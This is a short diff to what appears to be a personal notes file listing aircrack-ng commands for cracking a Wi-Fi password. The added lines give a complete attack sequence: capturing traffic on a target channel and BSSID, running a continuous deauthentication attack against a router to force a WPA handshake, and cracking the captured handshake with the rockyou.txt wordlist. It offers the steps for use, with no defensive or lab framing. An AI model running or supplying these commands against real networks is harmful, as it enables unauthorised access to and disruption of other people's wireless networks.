@@ -4,5 +4,8 @@
 > airmon-ng start wlan0
 > airmon-ng check kill
 > airodump-ng wlan0mon
-> airodump-ng -w test -c 6 --bssid <router mac> [// write(w) file name: test, channel ID: 6,bssid: mac address]
-
+> airodump-ng -w test -c 6 --bssid <router mac> wlan0mon [// write(w) file name: test, channel ID: 6,bssid: mac address]
+---- open new terminal----
+> aireplay-ng -0 0 -a <macaddress> wlan0mon [// Handshake happens]
+> aircrack-ng -w rockyou.txt test-01.cap
+-------------------------end------------------------
